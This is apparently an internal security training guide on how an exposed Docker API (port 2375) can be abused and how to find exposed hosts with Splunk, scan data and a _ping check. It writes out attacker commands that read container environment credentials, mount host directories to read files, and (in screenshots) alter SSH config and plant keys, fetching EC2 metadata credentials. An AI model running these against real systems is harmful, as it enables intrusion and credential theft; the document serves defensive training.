# Exploring the Docker API

Docker allows systems to run packaged applications in isolated environments called containers.  The Docker daemon manages the containers running on a system while also providing an API allowing users to interact with each container.

When this API is exposed, remote users can not only interact with the containers running on the system, but also use Docker to interact with the system itself.  This training document reviews several examples of how an exposed Docker API can lead to compromise and various methods for searching and testing.

- [Docker API Basics](#docker-api-basics)
	- [Set Up Docker Test Environment](#set-up-docker-test-environment)
	- [Docker API Options](#docker-api-options)
- [Exploring the Docker API](#exploring-the-docker-api)	
	- [Gather Docker Information](#gather-docker-information)
	- [Start Containers](#start-containers)
	- [Create Containers](#create-containers)
	- [Read Files on Host](#read-files-on-host)
	- [Create and Change Files on Host](#create-and-change-files-on-host)
- [Searching For Exposed APIs](#searching-for-exposed-apis)
	- [Nessus Scan Data](#nessus-scan-data)
	- [Cisco Firewall Logs](#cisco-firewall-logs)
	- [Software List](#software-list)
- [Testing Exposed APIs](#testing-exposed-apis)
	- [Simulating Docker Client](#simulating-docker-client)
	- [Searching for Exposed Docker APIs](#searching-for-exposed-docker-apis)

<br>

## Docker API Basics

- [Set Up Docker Test Environment](#set-up-docker-test-environment)
- [Docker API Options](#docker-api-options)


### Set Up Docker Test Environment

We need to know what actions can be performed when the Docker API is exposed.  Best way to find out is to stand up a Docker host in a lab environment or a using a personal cloud provider account.

To stand up a test Docker host and expose the API in AWS:

```powershell
(New-EC2KeyPair -ProfileName temp -Region us-east-1 -KeyName api).KeyMaterial | Out-File ~\api.pem
New-EC2Instance -ProfileName temp -Region us-east-1 -ImageId ami-0ed2f29599018e745 -InstanceType m1.large -KeyName api
(Get-EC2Instance -ProfileName temp -Region us-east-1).Instances
```

<br>

Then find `InstanceId` & `GroupId` and create a rule allowing port 2375 traffic which will be added to the Security Group:

```powershell
$rule = @{ IpProtocol="tcp"; FromPort="2375"; ToPort="2375"; IpRanges="<ip-ranges>" }
$iid = ((Get-EC2Instance -ProfileName temp -Region us-east-1).Instances | ? KeyName -eq api).InstanceId
$sgid = (Get-EC2Instance -ProfileName temp -Region us-east-1 -InstanceId $iid).Instances.SecurityGroups.GroupId
Grant-EC2SecurityGroupIngress -ProfileName temp -Region us-east-1 -GroupId $sgid -IpPermission $rule
```

<br>

Get the Administrator password for the Windows instance with:

```powershell
Get-EC2PasswordData -ProfileName temp -Region us-east-1 -InstanceId $iid -Pemfile ~\api.pem
```

<br>


### Docker API Options

For Docker Desktop, the API can be exposed in the settings page:

![](images/Exploring%20the%20Docker%20API/image029.png)<br><br>

Log in, open PowerShell, disable the firewall, and configure Docker to expose the API:

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
$content = @'
{"hosts":["tcp://0.0.0.0:2375","npipe://"]}
'@
Set-Content -Value $content -Path C:\ProgramData\docker\config\daemon.json
Restart-Service docker
```

<br>

Or if using a Linux host:

```
sudo apt-get update
sudo apt install docker.io -y
sudo systemctl start docker.service

sudo mkdir -p /etc/systemd/system/docker.service
sudo vi /etc/systemd/system/docker.service/override.conf

[Service]
ExecStart=
ExecStart=/usr/bin/dockerd

sudo vi /etc/docker/daemon.json

{"hosts":"fd://","tcp://0.0.0.0:2375"}

sudo systemctl daemon-reload
sudo systemctl restart docker.service

sudo usermod -aG docker ubuntu
# logout and login
```

<br>

The docker service should now be listening on all interfaces (0.0.0.0) on port 2375:

![](images/Exploring%20the%20Docker%20API/image006.png)<br><br>

And you should be able to access port 2375 with a browser:

![](images/Exploring%20the%20Docker%20API/image007.png)

The API can also be setup to use TLS (port 2376) which requires the remote user to provide certificates for authentication:

![](images/Exploring%20the%20Docker%20API/image042.png)<br><br>

These certs are stored in a user's `.docker` directory or in the case of Docker Toolbox, the `.docker\machine\certs` directory:

![](images/Exploring%20the%20Docker%20API/image043.png)<br><br>


Once you're set up, start generating some artifacts for testing:

- Create a `fakecreds.txt` file with fake sensitive info
- Pull an image, run a container with it and stop it
- Run a different container and leave it running

Execute commands on the Docker host by using the `-H` flag and the remote system's IP Address:

![](images/Exploring%20the%20Docker%20API/image008.png)<br><br>


## Exploring the Docker API

These are some general ways an exposed Docker API can be used to support the goals of an adversary:

- [Gather Docker Information](#gather-docker-information)
- [Start Containers](#start-containers)
- [Create Containers](#create-containers)
- [Read Files on Host](#read-files-on-host)
- [Create and Change Files on Host](#create-and-change-files-on-host)


### Gather Docker Information

List containers that are currently running:

![](images/Exploring%20the%20Docker%20API/image009.png)<br><br>


List both running and stopped containers:

```powershell
docker -H <ip>:2375 ps -a
```

![](images/Exploring%20the%20Docker%20API/image010.png)<br><br>

Inspect containers for credentials, external storage, and network information:

```powershell
# envars passed to docker
docker -H <ip>:2375 inspect <container>  

OR
# all envars in container
docker -H <ip>:2375 exec -i <container> env
```

<br>

Interact with the host's network:

```powershell
docker -H <ip>:2375 run --network=host --rm marsmensch/nmap -ox 10.100.0.1
```

<br>

Interact with a running container:

```powershell
docker -H <ip>:2375 exec Blah_blah ls /tmp/userone
```

![](images/Exploring%20the%20Docker%20API/image011.png)<br><br>

Interact with a running container using PowerShell:

![](images/Exploring%20the%20Docker%20API/image012.png)<br><br>

Start a stopped container:

```powershell
docker -H <ip>:2375 start a1b2c3d4e5
```

<br>

### Create Containers

The Docker API also allows a remote user to download images and use them to create containers.

Pull an image:

```powershell
docker -H <ip>:2375 pull alpine
```

Start a new container with that image:

```powershell
docker -H <ip>:2375 run -t -d --name new_container_1 alpine
```

![](images/Exploring%20the%20Docker%20API/image013.png)<br><br>

### Read Files on the Host

Mounting a host directory when creating a container allows a remote user to read files on the host system:

```powershell
docker -H <ip>:2375 run -t -d --name new_container_2 -v /home/userone:/tmp/userone alpine
```

![](images/Exploring%20the%20Docker%20API/image014.png)<br><br>

Now the container can list the mounted directory and access sensitive files on the host machine:

```powershell
docker -H <ip>:2375 exec new_container_2 ls /tmp/userone
```

![](images/Exploring%20the%20Docker%20API/image015.png)<br><br>

Containers can also access the Docker host's networks.  A container can be used to scan for other hosts on the network or in the case of EC2 instances, use the network to obtain sensitive information.

Here, a container is started and used to make a web request for [EC2 instance meta-data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) that contains the Docker host machine's AWS credentials:

![](images/Exploring%20the%20Docker%20API/image028.png)<br><br>

### Create and Change Files on Host

When directories on the host are mapped to container volumes, files on the host machine can be created or changed.

For example, a remote user can start a container which mounts the host's `/etc` directory and access configuration files like `ssh_config`:

![](images/Exploring%20the%20Docker%20API/image032.png)<br><br>

Now the host has been configured to allow password authentication:

![](images/Exploring%20the%20Docker%20API/image033.png)<br><br>

And the remote user can log in to the host as one of its users:

![](images/Exploring%20the%20Docker%20API/image034.png)<br><br>

Another option is to create a new SSH key pair:

![](images/Exploring%20the%20Docker%20API/image035.png)<br><br>

And place the public key in the user's `.ssh` directory:

![](images/Exploring%20the%20Docker%20API/image036.png)<br><br>

The remote user can now log in using the private key:

![](images/Exploring%20the%20Docker%20API/image037.png)<br><br>

## Searching for Exposed APIs

- [Nessus Scan Data](#nessus-scan-data)
- [Endpoint Security Tools](#endpoint-security-tools)
- [Software List](#software-list)


### Nessus Scan Data

Searching nessus scan data shows systems that have Docker API ports 2375/2376 listening on all interfaces (0.0.0.0):

![](images/Exploring%20the%20Docker%20API/image003.png)<br><br>

Search for other hosts that have similar nessus scan data:

```
index=* sourcetype=securityCenter category="Netstat Active Connections" "0.0.0.0:2375" OR "0.0.0.0:2376"
| rex field=_raw "(?<listening_on>0\.0\.0\.0\:2375)" 
| rex field=_raw "(?<listening_tls_on>0\.0\.0\.0\:2376)" 
| table hostname dest listening_on listening_tls_on
```

![](images/Exploring%20the%20Docker%20API/image004.png)<br><br>

This combines both of the searches above:

```
index=* sourcetype=securityCenter 
    plugin_name="Unix / Linux Running Processes Information" 
      OR  plugin_name="Netstat Active Connections" 
    "0.0.0.0:2375 " 
      OR "0.0.0.0:2376 " OR ":::2375" OR ":::2376" 
| fillnull value="N/A" aws-instance-instance-id 
| dedup host-ip hostname aws-instance-instance-id  
| rex field=_raw "(?<listening_on>(0\.0\.0\.0|::)\:2375 )"  
| rex field=_raw "(?<listening_tls_on>(0\.0\.0\.0|::)\:2376 )"   
| stats values(listening_on) values(listening_tls_on) values(aws-instance-instance-id) values(host-ip) count by hostname
```

![](images/Exploring%20the%20Docker%20API/image005.png)<br><br>

### Endpoint Security Tools

Endpoint security tools like FireEye HX can be used to search for network events involving ports 2375 and 2376:

![](images/Exploring%20the%20Docker%20API/image040.png)<br><br>


### Software List

Another way is to get a list of machines that have Docker software installed and test each one.

We can use Splunk:

![](images/Exploring%20the%20Docker%20API/image041.png)<br><br>

The [Computers with a Specific Product]() report from the [CMDB]() provides similar data.

Select a product such as Docker Desktop:

![](images/Exploring%20the%20Docker%20API/image016.png)<br><br>


Export the results to a CSV file.

Then do same for Docker for Windows, Docker Toolbox, Docker.CLI, and Docker.Installer:

![](images/Exploring%20the%20Docker%20API/image017.png)<br><br>

Export to CSV, then capture into objects:

```powershell
$loc = "C:\Users\userone\Downloads"
$t = (Get-ChildItem $loc\*.csv).FullName | %{Get-Content $_ | Select -Skip 3 | ConvertFrom-Csv}
$t | Select Details_Table0_Netbios_Name0,Details_Table0_User_Name0,Details_Table0_ProductName,Details_Table0_ProductVersion
```

You now have a list of hosts with Docker software installed:

![](images/Exploring%20the%20Docker%20API/image018.png)<br><br>

This contains 70 unique hosts with a Docker application installed:

![](images/Exploring%20the%20Docker%20API/image019.png)<br><br>

Put them in objects for use in script automation:

```powershell
$dhosts = $t | Select -exp Details_Table0_Netbios_Name0 | Select -Unique
```

## Testing Exposed APIs

- [Simulating Docker Client](#simulating-docker-client)
- [Searching for Exposed Docker APIs](#searching-for-exposed-docker-apis)



### Simulating Docker Client

Let's see how the Docker client connects to a remote system using the API:

By giving it a host and port that we know is up, we can see what gets sent after the 3-way handshake:

![](images/Exploring%20the%20Docker%20API/image020.png)<br><br>

The client requests a page named `_ping`.  Testing this on a lab host exposing the API shows us what should be returned:

![](images/Exploring%20the%20Docker%20API/image021.png)<br><br>

So we can take a list of hosts and request the `_ping` page for each, checking for the string `OK`:

```powershell
$dhosts | %{if((wget http://$($_):2375/_ping).Content -eq "OK"){Write-Host $_}}
```

![](images/Exploring%20the%20Docker%20API/image023.png)<br><br>

The script works through each host, attempting to establish a connection on port 2375:

![](images/Exploring%20the%20Docker%20API/image022.png)<br><br>


### Searching for Exposed Docker APIs

We can package this into a function called `Find-DockerHostsOnline` which I've added to the `DOCKERmodule`:

One requirement is that the proxy environment variable must be removed.  The function will detect this and prompt the user to remove it:

![](images/Exploring%20the%20Docker%20API/image045.png)<br><br>

Once this is done, it will work through the known list of Docker hosts checking both API ports for exposure:

![](images/Exploring%20the%20Docker%20API/image046.png)<br><br>
